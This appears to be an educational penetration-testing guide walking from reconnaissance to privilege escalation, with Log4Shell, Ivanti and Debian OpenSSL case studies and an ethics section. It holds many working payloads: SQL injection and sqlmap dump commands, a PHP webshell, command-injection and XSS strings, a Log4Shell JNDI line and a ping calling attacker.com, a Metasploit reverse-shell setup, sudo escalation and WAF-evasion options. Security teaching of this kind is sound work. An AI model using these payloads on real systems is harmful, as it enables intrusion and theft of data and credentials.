# Complete Exploitation Methodologies: From Recon to Root

## Table of Contents
1. [The Attacker's Mindset: How Exploitation Really Works](#mindset)
2. [Phase 1: Reconnaissance & Information Gathering](#recon)
3. [Phase 2: Vulnerability Discovery & Analysis](#discovery)
4. [Phase 3: Exploitation - Gaining Access](#exploitation)
5. [Phase 4: Post-Exploitation & Privilege Escalation](#postex)
6. [Real-World Exploit Case Studies](#casestudies)
7. [Tool Deep Dives & Configuration](#tools)
8. [Reporting & Documentation](#reporting)

---

<a name="mindset"></a>
## The Attacker's Mindset: How Exploitation Really Works

Before diving into commands, understand this: **Every exploit follows the same three-step pattern**:

> **Find → Classify → Exploit** 

The adversary doesn't guess. They follow a well-documented recipe:

1. **Find exposed services** (VPNs, web apps, databases) using internet-wide scanners
2. **Classify exact versions** (Apache/2.4.49, OpenSSL/1.0.1, etc.)
3. **Match CVEs to versions** and execute pre-built exploits 

**Real Example:** In 2024-2025, attackers scanned for Ivanti Connect Secure appliances, identified versions vulnerable to CVE-2025-0282 (stack-based buffer overflow), and deployed web shells within minutes of exposure .

---

<a name="recon"></a>
## Phase 1: Reconnaissance & Information Gathering

### 1.1 Running FinalRecon (Your Starting Point)

FinalRecon is a Python-based reconnaissance tool that automates initial data collection .

```bash
# Basic full reconnaissance
python3 finalrecon.py --full --url https://example.com

# Specific modules
python3 finalrecon.py --url https://example.com --headers --sslinfo --whois
python3 finalrecon.py --url https://example.com --crawl --dns --sub
python3 finalrecon.py --url https://example.com --dir --wayback --ps
```

**What FinalRecon Does Behind the Scenes:**
- **HTTP Headers:** Reveals server software (Apache/Nginx/IIS), programming language (PHP/ASP.NET), and security headers
- **SSL Certificate:** Exposes certificate details, expiration dates, and issuer information
- **WHOIS:** Shows domain registration, owner details, and name servers
- **DNS Enumeration:** Finds A, MX, NS, TXT records
- **Subdomain Discovery:** Uses certificate transparency logs and DNS brute-forcing
- **Directory Enumeration:** Tests common paths like `/admin`, `/backup`, `/config`
- **Wayback Machine:** Retrieves historical URLs that might still be accessible 

### 1.2 Google Dorks: Finding What Should Be Hidden

Google dorks are search operators that find sensitive information indexed by search engines.

**Source Code & Configuration Files:**
```bash
# Find exposed .env files with database credentials
site:target.com ext:env | ext:config | ext:conf

# Find backup files containing sensitive data
site:target.com ext:bak | ext:backup | ext:old

# Find exposed Git repositories
site:target.com ".git" "config" filetype:git
```

**Real-World Example (2023):** A security researcher found a `.env.bak` file on a Fortune 500 company's public web server using `site:company.com ext:env`. The file contained live AWS keys, granting access to 50+ S3 buckets with customer PII .

**Error Messages That Leak Information:**
```bash
# SQL errors revealing database structure
site:target.com intext:"sql syntax near" | intext:"Warning: mysql_connect()"

# Path disclosure errors
site:target.com intext:"Warning: include(" | intext:"failed to open stream"
```

**How to Test:** When you find error messages, try to trigger them yourself. Input single quotes (`'`) into URL parameters or form fields. If the application returns a database error, you've confirmed SQL injection potential.

### 1.3 GitHub Dorks: Finding Secrets in Code

Developers accidentally commit secrets to public repositories constantly. Here's how to find them :

**Generic Credentials:**
```bash
"password" "db_password" "DB_PASSWORD" "api_key" "API_KEY" "secret"
"private_key" "PRIVATE_KEY" "ssh" "access_key" "ACCESS_KEY"
```

**Cloud Provider Keys (Most Valuable):**
```bash
"AWS_ACCESS_KEY_ID" "AWS_SECRET_ACCESS_KEY"
"GOOGLE_APPLICATION_CREDENTIALS" "service_account.json"
"AZURE_CLIENT_SECRET" "AZURE_SUBSCRIPTION_ID"
```

**Database Connection Strings:**
```bash
"mongodb://" "mysql://" "postgresql://" "jdbc:mysql"
"mongodb+srv://" "redis://"
```

**Real-World Example (2024):** A developer committed a `.env` file with production AWS keys to a public GitHub repo. Within 3 minutes of the commit, automated scrapers found the keys and used them to mine cryptocurrency, costing the company $50,000 .

**How to Test Found Credentials:**
```bash
# Test AWS keys
aws configure set aws_access_key_id FOUND_KEY
aws configure set aws_secret_access_key FOUND_SECRET
aws s3 ls  # If this works, you have access

# Test database credentials
mysql -h database.target.com -u found_user -p
```

---

<a name="discovery"></a>
## Phase 2: Vulnerability Discovery & Analysis

### 2.1 Subdomain Enumeration (Finding Hidden Entry Points)

Subdomains often host staging environments, admin panels, or internal tools that are less secure than the main domain.

**Using Subfinder:**
```bash
# Comprehensive subdomain discovery
subfinder -d example.com -all -silent -o subdomains.txt

# Recursive brute-force
subfinder -d example.com -all -silent -r -o subdomains_recursive.txt
```

**Using Chaos (ProjectDiscovery's dataset):**
```bash
chaos -d example.com -o chaos_subs.txt
```

**Real Example:** Using `chaos -d uber.com`, researchers found 50,000+ subdomains, including `api-staging-01.uber.com` which had a critical vulnerability .

### 2.2 Probing Live Hosts (Finding What Responds)

Not all subdomains are active. Filter out dead hosts:

```bash
# Check which subdomains are alive
cat subdomains.txt | httpx -follow-host-redirects -status-code -title -tech-detect -o live_hosts.txt
```

**What HTTPX Tells You:**
- **Status Code:** 200 (OK), 301 (Redirect), 403 (Forbidden - potential bypass), 401 (Authentication required)
- **Title:** Page titles often reveal purpose ("Admin Panel", "Internal Dashboard")
- **Tech Detect:** Identifies frameworks (React, Angular, WordPress, Drupal)

### 2.3 Technology Fingerprinting (WhatWeb)

Knowing the exact technology stack tells you which CVEs to search for .

```bash
# Basic scan
whatweb https://target.com

# Verbose output - shows all detected technologies
whatweb -v https://target.com

# Aggressive scan (more requests, more accurate)
whatweb -a 3 https://target.com

# Export as JSON for automation
whatweb --log-json=output.json https://target.com
```

**What to Look For:**
- **Outdated versions:** Apache 2.2.x, Nginx < 1.20, PHP < 7.4
- **CMS platforms:** WordPress, Drupal, Joomla (each has known vulnerabilities)
- **JavaScript libraries:** jQuery < 3.5.0 (XSS), Lodash < 4.17.21 (Prototype Pollution)

**Real-World Example (CVE-2021-44228 - Log4Shell):** Attackers scanned for any server using Log4j < 2.15.0, then sent a simple payload `${jndi:ldap://attacker.com/exploit}` in the User-Agent header. This gave them Remote Code Execution (RCE) on thousands of servers worldwide .

### 2.4 Directory & File Bruteforcing (Finding Hidden Paths)

Web servers often have directories and files that aren't linked anywhere. Bruteforcing finds them.

**Using FFUF (Fast Fuzzing):**
```bash
# Directory bruteforcing
ffuf -recursion -mc all -ac -c -e .php,.html,.txt,.bak,.zip -w wordlist.txt -u https://target.com/FUZZ

# Parameter discovery
ffuf -mc all -ac -u https://target.com -w parameter_wordlist.txt -H "FUZZ: testvalue"
```

**Using Dirsearch:**
```bash
dirsearch -r -f -u https://target.com --extensions=php,html,asp,txt,bak -w wordlist.txt -t 40
```

**Common Findings:**
- `/backup/` - Often contains database dumps
- `/phpmyadmin/` - Database management interface
- `/api/` - Internal APIs without proper authentication
- `/swagger-ui.html` - API documentation revealing all endpoints
- `/jenkins/` - CI/CD server with potential RCE

---

<a name="exploitation"></a>
## Phase 3: Exploitation - Gaining Access

### 3.1 The Exploitation Workflow

Once you identify a service and its version, follow this process :

1. **Search for CVEs:** Check NVD (nvd.nist.gov) or Exploit-DB for the exact version
2. **Find Proof-of-Concept (PoC):** Search GitHub for the CVE number
3. **Test in a safe environment first** (never directly on production without authorization)
4. **Execute the exploit** using Metasploit or manual tools

### 3.2 Using Metasploit (The Industry Standard)

Metasploit is a framework containing hundreds of pre-built exploit modules .

```bash
# Start Metasploit
msfconsole

# Search for exploits by CVE
search CVE-2021-44228

# Use a specific module
use exploit/multi/http/log4shell_header_injection

# Show required options
show options

# Set target
set RHOSTS target.com
set SRVHOST 0.0.0.0
set PAYLOAD linux/x64/shell_reverse_tcp

# Execute
exploit
```

**What Happens When You Run Exploit:**
1. Metasploit sends a specially crafted request to the target
2. If vulnerable, the target executes code provided by Metasploit
3. A "shell" or "session" opens, giving you command-line access
4. You can now run commands on the target system 

### 3.3 SQL Injection Deep Dive

SQL injection occurs when user input is directly inserted into SQL queries without sanitization.

**Manual Testing:**
```bash
# Basic test - if this returns all records, you have SQLi
1' OR '1'='1' --

# Union-based extraction (find number of columns)
1' ORDER BY 10 -- 
1' UNION SELECT NULL,NULL,NULL --

# Extract database names
1' UNION SELECT database(),user(),version() --

# Extract table names
1' UNION SELECT table_name, NULL FROM information_schema.tables --
```

**Automated with SQLMap:**
```bash
# Capture request in Burp Suite, save to file, then:
sqlmap -r captured_request.txt --batch --dbs

# Dump specific database
sqlmap -r request.txt -D database_name --tables

# Dump user credentials
sqlmap -r request.txt -D database_name -T users --dump
```

**Real-World Example (DVWA Lab):** Using SQLMap against a vulnerable login form, researchers dumped the entire user database including password hashes. The admin hash was cracked with John the Ripper in seconds .

### 3.4 File Upload Vulnerabilities

File upload flaws allow attackers to upload malicious files (webshells) to the server.

**Test Cases to Try:**
```bash
# Double extension bypass
shell.php.jpg

# Case variation bypass
shell.PHP

# Null byte injection (older PHP versions)
shell.php%00.jpg

# Content-Type manipulation
# Change Content-Type: application/x-php to image/jpeg

# .htaccess upload (Apache)
# Upload .htaccess that forces all .jpg files to execute as PHP
```

**PHP Webshell Example:**
```php
<?php system($_GET['cmd']); ?>
```

**How to Test:**
1. Upload a harmless test file (`test.txt`)
2. Find where it's stored (check response, guess paths)
3. If you can access it, try uploading `test.php` with simple PHP code
4. If blocked, try the bypass techniques above

**Real-World Example (Bludit CMS CVE):** Attackers uploaded files named `image.php.jpg` containing PHP code. The server saved the file, and when accessed, the PHP code executed, giving full server control .

### 3.5 Command Injection

Command injection occurs when user input is passed to system commands without sanitization.

**Test Payloads:**
```bash
# Basic command chaining
; ls
| whoami
|| id
& ping -c 10 attacker.com
`cat /etc/passwd`
$(cat /etc/passwd)
```

**How to Test:**
1. Find any input field (search, ping tool, file converter)
2. Enter `127.0.0.1; ls`
3. Check if directory listing appears in response
4. If yes, try `; whoami` to see current user

### 3.6 Cross-Site Scripting (XSS)

XSS allows attackers to execute JavaScript in victims' browsers.

**Test Payloads:**
```html
<!-- Basic alert -->
<script>alert(1)</script>

<!-- Image onerror -->
<img src=x onerror=alert(1)>

<!-- SVG payload -->
<svg onload=alert(1)>

<!-- Bypass filters -->
<scr<script>ipt>alert(1)</scr<script>ipt>
```

**How to Test:**
1. Enter `<script>alert(1)</script>` into any input field
2. If an alert box appears, XSS is confirmed
3. Check if the payload persists (stored XSS) or only triggers once (reflected XSS)

---

<a name="postex"></a>
## Phase 4: Post-Exploitation & Privilege Escalation

### 4.1 What to Do After Gaining Access

Once you have initial access (a "foothold"), your goal is to escalate privileges and explore.

**Immediate Actions:**
```bash
# On Linux target
whoami                    # Current user
id                        # User privileges
uname -a                  # Kernel version
cat /etc/passwd           # All users
cat /etc/shadow           # Password hashes (requires root)
sudo -l                   # What commands can run as sudo
ps aux                    # Running processes
netstat -tulpn            # Network connections
find / -perm -4000 2>/dev/null  # SUID binaries (potential privilege escalation)
```

```cmd
# On Windows target
whoami
whoami /priv
systeminfo
net users
net localgroup administrators
tasklist
netstat -ano
```

### 4.2 Privilege Escalation Vectors

**Kernel Exploits:** If the kernel is outdated, use pre-built exploits.
```bash
# Check kernel version
uname -r
# Search for exploit
searchsploit linux kernel 3.2
```

**SUID Binaries:** Files that run as the owner (often root).
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# If you find something like /usr/bin/pkexec, check GTFO Bins for exploit
```

**Sudo Misconfigurations:**
```bash
# Check sudo rights
sudo -l
# If you see (ALL) NOPASSWD: /usr/bin/python, you can escalate:
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

**Cron Jobs:** Scheduled tasks running as root.
```bash
cat /etc/crontab
# If a writable script runs as root, replace it with reverse shell
```

**Real-World Example (Dirty Pipe - CVE-2022-0847):** This Linux kernel vulnerability allowed any user to overwrite root-owned files. Attackers could modify `/etc/passwd` to create a root user or overwrite SSH keys .

---

<a name="casestudies"></a>
## Real-World Exploit Case Studies

### Case Study 1: Ivanti Connect Secure RCE (CVE-2025-0282)

**The Vulnerability:** Stack-based buffer overflow in the `clientCapabilities` parameter of Ivanti's IF-T connection handler. The unsafe use of `strncpy()` allowed out-of-bounds writes before authentication .

**How Attackers Exploited It:**
1. Scanned for Ivanti appliances on port 443 using Shodan
2. Identified vulnerable versions (pre-patch)
3. Crafted malicious `clientCapabilities` parameter exceeding buffer limits
4. Used VTable hijacking and ROP chains to bypass ASLR
5. Gained unauthenticated RCE on the appliance
6. Deployed web shells (GIFTEDVISITOR) for persistence
7. Moved laterally into corporate networks

**Impact:** Full compromise of VPN gateways, leading to corporate network breaches for hundreds of organizations .

### Case Study 2: Log4Shell (CVE-2021-44228)

**The Vulnerability:** Log4j, a Java logging library, allowed JNDI lookups in log messages. Attackers could force the server to fetch and execute remote code.

**How Attackers Exploited It:**
1. Identified any service using Log4j (HTTP headers, User-Agent, form inputs)
2. Sent payload: `${jndi:ldap://attacker.com/exploit}`
3. Server fetched malicious Java class from attacker's LDAP server
4. Class executed, giving attacker RCE

**Why It Was Devastating:** The library was in millions of applications including AWS, iCloud, Steam, and Tesla. Attackers automated scanning and exploited systems within hours of disclosure .

### Case Study 3: Debian OpenSSL Weak Keys (2008)

**The Vulnerability:** Debian maintainers removed all entropy sources except process PID when generating SSL keys. With PID limited to 32,768 possibilities, all keys were predictable.

**How Attackers Exploited It:**
1. Generated all 32,768 possible SSH key pairs
2. Scraped SSH public keys from servers
3. Matched public keys to pre-generated private keys
4. Logged into servers as root using matched keys

**Impact:** Every Debian/Ubuntu server created between September 2006 and May 2008 was vulnerable. Attackers could trivially obtain root access .

---

<a name="tools"></a>
## Tool Deep Dives & Configuration

### Burp Suite: The Professional's Choice

Burp Suite intercepts and modifies HTTP traffic, making it essential for web testing .

**Setting Up Burp Suite:**
1. Install Burp Suite Community or Pro
2. Set proxy to listen on `127.0.0.1:8080`
3. Configure browser to use proxy
4. Install Burp's CA certificate in browser

**Essential Burp Extensions:**
- **Burp Bounty Pro:** Adds 254 pre-built vulnerability detection profiles. Can detect SQLi, XSS, SSRF, and RCE automatically. Includes AI-powered scanning that identifies attack surfaces and suggests relevant payloads .
- **Autorize:** Tests for authorization bypasses by replaying requests with different session tokens
- **Turbo Intruder:** Faster bruteforcing than standard Intruder

**Using Burp for SQL Injection:**
1. Navigate to target
2. Turn on proxy interception
3. Submit a form with a single quote (`'`) in a parameter
4. Forward to Repeater (Ctrl+R)
5. Modify parameter to `1' OR '1'='1' --`
6. Send request and analyze response

### Nmap Configuration for Maximum Results

Nmap is the industry standard for port scanning .

**Basic Service Scan:**
```bash
nmap -sV -sC -O target.com
```

**Full Port Scan (Stealthy):**
```bash
nmap -p- -Pn --min-rate 1000 --max-retries 1 target.com
```

**UDP Scan (Often Overlooked):**
```bash
nmap -sU --top-ports 100 target.com
```

**Firewall Evasion:**
```bash
# Fragment packets
nmap -f -Pn target.com

# Decoy scan
nmap -D RND:10 target.com

# Source port manipulation (DNS)
nmap --source-port 53 target.com
```

### SQLMap Advanced Usage

SQLMap automates SQL injection detection and exploitation .

**Basic Detection:**
```bash
sqlmap -u "https://target.com/page?id=1" --batch
```

**With Cookie Authentication:**
```bash
sqlmap -u "https://target.com/page?id=1" --cookie="PHPSESSID=abc123"
```

**Extract Database:**
```bash
# List databases
sqlmap -u "https://target.com/page?id=1" --dbs

# List tables in database
sqlmap -u "https://target.com/page?id=1" -D database_name --tables

# Dump table
sqlmap -u "https://target.com/page?id=1" -D database_name -T table_name --dump
```

**Bypassing WAF:**
```bash
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between
```

---

<a name="reporting"></a>
## Reporting & Documentation

The final phase is arguably the most important. Your report is what gets vulnerabilities fixed .

### What Every Finding Must Include

**Vulnerability Name:** SQL Injection in Login Parameter

**Location:** `https://target.com/login.php?user=admin`

**Description:** The `user` parameter is vulnerable to time-based blind SQL injection. User input is directly concatenated into SQL queries without sanitization or parameterization.

**Impact (CVSS Score):** 9.0 (Critical)
- Attackers can bypass authentication
- Full database extraction including user credentials
- Potential RCE on database server

**Proof of Concept:**
```bash
# Request
GET /login.php?user=admin' AND SLEEP(5)-- HTTP/1.1
Host: target.com

# Response delayed by 5 seconds confirming vulnerability

# Automated extraction
sqlmap -u "https://target.com/login.php?user=admin" --dbs
# Output: Retrieved 5 databases including 'users'
```

**Steps to Reproduce:**
1. Navigate to `https://target.com/login.php`
2. Set `user` parameter to `admin' AND SLEEP(5)--`
3. Observe 5-second delay in response
4. Use SQLMap to extract data as shown above

**Remediation:**
- Use parameterized queries/prepared statements
- Apply strict input validation (allow only alphanumeric)
- Implement least privilege database accounts
- Deploy WAF with SQL injection rules

**References:**
- CWE-89: SQL Injection
- OWASP SQL Injection Prevention Cheat Sheet

---

## Final Notes: Ethics & Scope

**You Must Have Written Authorization** before testing any system you don't own .

**Rules of Engagement Checklist:**
- Written authorization with signatures
- Defined scope (IP ranges, domains, applications)
- Allowed testing times (avoid business hours)
- Prohibited actions (no DoS, no data exfiltration)
- Emergency contact and kill-switch procedures

**Document Everything:**
- Timestamps of all actions
- Screenshots of proof-of-concept
- Captured network traffic
- Hashes of exploited files

**Clean Up:**
- Remove all uploaded files
- Close all sessions
- Restore any modified configurations
- Verify with client that access is removed 

---
